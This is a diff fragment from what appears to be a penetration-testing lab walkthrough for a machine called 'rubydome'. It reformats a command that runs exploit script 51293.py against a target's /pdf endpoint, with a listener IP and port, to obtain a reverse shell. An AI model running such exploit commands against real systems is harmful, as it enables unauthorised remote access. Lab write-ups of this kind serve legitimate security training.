@@ -64,7 +64,9 @@ Inspect Element to find Parameter
 Getting reverse shell using this exploit.
 
 ┌──(kali㉿kali-linux-2022-2)-[~/offsec/rubydome]
-└─$ python3 51293.py -s 192.168.49.56 80 -w <http://192.168.56.22:3000/pdf> -p url
+└─$ 
+
+#### python3 51293.py -s 192.168.49.56 80 -w 'http://192.168.56.22:3000/pdf' -p url
 
         _ __,~~~/_        __  ___  _______________  ___  ___
     ,~~`( )_( )-\\|       / / / / |/ /  _/ ___/ __ \\/ _ \\/ _ \\
